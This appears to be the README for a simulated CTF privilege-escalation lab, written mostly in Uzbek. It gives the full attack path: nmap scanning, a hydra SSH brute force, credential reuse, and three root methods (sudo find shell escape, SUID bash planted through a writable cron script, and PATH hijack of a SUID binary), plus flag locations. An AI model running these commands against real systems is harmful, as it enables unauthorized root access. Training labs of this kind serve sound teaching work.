# CodeNest LinuxPrivEsc Lab — CTF.UZ Arena Labs

## Texnik profil

- Attack box: Kali Linux, `192.168.56.10/24`.
- Target: Ubuntu Server `22.04.5 LTS`, `192.168.56.101`.
- Daraja: Intermediate.
- Runtime: 75 daqiqa.
- Ball: 400 XP.
- Foydalanuvchilar: `student`, `devuser`, `root`.
- Bu to‘liq holat saqlaydigan virtual terminal simulyatsiyasi. Buyruqlar Render hostiga yoki haqiqiy tarmoqqa yuborilmaydi; fayl tizimi, foydalanuvchilar, ruxsatlar, SSH, cron va SUID holatlari MongoDB sessiyasida saqlanadigan virtual target modelidir.

## Asosiy oqim

1. `nmap 192.168.56.0/24` — target topiladi (`192.168.56.101`).
2. `nmap -p22 -sV 192.168.56.101` — SSH 22/tcp va OpenSSH versiyasi ko‘rinadi.
3. `hydra -l student -P rockyou.txt ssh://192.168.56.101` — simulyatsiya qilingan wordlist natijasida `student / princess1` aniqlanadi (virtual 5:38 vaqt).
4. `ssh student@192.168.56.101` — target shell ochiladi.
5. `find / -iname "Flag1.txt" 2>/dev/null` va topilgan to‘liq yo‘ldan `cat` — Flag1 olinadi.
6. `ls -la /opt/codenest` va `cat /opt/codenest/backup.sh` — `devuser` credentiali topiladi.
7. `su devuser` — terminal `Password:` promptiga o‘tadi. Parol kiritishda UI inputi yashiriladi; qiymat MongoDB terminal tarixida `********` ko‘rinishida saqlanadi.
8. `cat /opt/codenest/Flag2.txt` — Flag2 olinadi.
9. Quyidagi uchta root yo‘lidan bittasi bajariladi.
10. `cat /root/Flag3.txt` — dinamik flagni chiqaradi; flag submit endpointi orqali 400 XP beriladi.

## Root yo‘li A — sudoers / find

```bash
sudo -l
sudo find . -exec /bin/sh \; -quit
whoami
id
cat /root/Flag3.txt
```

Simulyator faqat `devuser` uchun ko‘rsatilgan `NOPASSWD: /usr/bin/find` ruxsatini qabul qiladi. Boshqa sudo buyruqlariga ruxsat yo‘q.

## Root yo‘li B — writable cron script

```bash
cat /etc/cron.d/codenest-cleanup
ls -la /opt/codenest/cleanup.sh
cat /opt/codenest/cleanup.sh
echo 'chmod +s /bin/bash' > /opt/codenest/cleanup.sh
sleep 120
bash -p
whoami
cat /root/Flag3.txt
```

**Moslik tuzatishi:** fayl talablarga muvofiq `root:root`, `0666` bo‘lib qoladi. `0666` faylda execute biti yo‘q, shuning uchun cron qatori skriptni to‘g‘ridan-to‘g‘ri chaqirmaydi; labda cron qatori `*/2 * * * * root /bin/bash /opt/codenest/cleanup.sh` shaklida beriladi. `sleep 120` haqiqiy 2 daqiqa kutmaydi — virtual lab soatini oldinga surib, cron tickni deterministik tarzda bajaradi.

## Root yo‘li C — SUID backup_tool va PATH hijack

```bash
find / -perm -4000 2>/dev/null
cat /opt/codenest/backup_tool.c
mkdir -p /tmp/hijack
echo '/bin/chmod +s /bin/bash' > /tmp/hijack/chmod
chmod +x /tmp/hijack/chmod
export PATH=/tmp/hijack:$PATH
/usr/local/bin/backup_tool
bash -p
whoami
cat /root/Flag3.txt
```

`backup_tool` virtual C dasturi `/bin/cp` ni mutlaq yo‘l bilan, `chmod` ni esa PATH orqali chaqiradi. Shuning uchun labdagi shim faqat `chmod` lookup’ini tutadi va o‘z ichida `/bin/chmod` mutlaq yo‘lidan foydalanadi — rekursiya yuz bermaydi.

## Qo‘llab-quvvatlanadigan buyruqlar

Kali attack box: `help`, `pwd`, `whoami`, `hostname`, `uname -a`, `ip a`, `ip addr`, `ip route`, `ip neigh`, `ifconfig`, `ping`, `nmap`, `hydra`, `ssh`, `ls`, `cat`, `which`, `history`.

Ubuntu target: `help`, `whoami`, `id`, `groups`, `hostname`, `uname -a`, `pwd`, `cd`, `ls -la`, `cat`, `grep`, `find`, `stat`, `file`, `getent passwd`, `env`, `printenv`, `ps aux`, `ss -tulpn`, `systemctl status cron`, `crontab -l`, `sudo -l`, `su`, `sleep`, `bash -p`, `mkdir`, kerakli `chmod`, `export PATH`, `date`, `df -h`, `free -h`.

Bu umumiy-purpose Bash emas: ro‘yxatdan tashqari buyruqlar xavfsizlik uchun bajarilmaydi va terminalda `command not found/unsupported` xabari qaytariladi. Hech qanday `child_process`, `exec`, `spawn`, real `fs` yozuvi yoki tarmoq exploit so‘rovi ishlatilmaydi.

## Test

```bash
npm run test:arena
```

Smoke testlar quyidagilarni tekshiradi: avvalgi Linux/Windows/UAC xonalari; Windows CMD navigatsiyasi va service/ACL ketma-ketligi; CodeNest Nmap → Hydra → SSH → lateral movement; Flag1/Flag2; sudo find, cron va SUID/PATH root yo‘llari; dinamik Flag3; password history redaction; noma’lum buyruqlarning hostda bajarilmasligi.
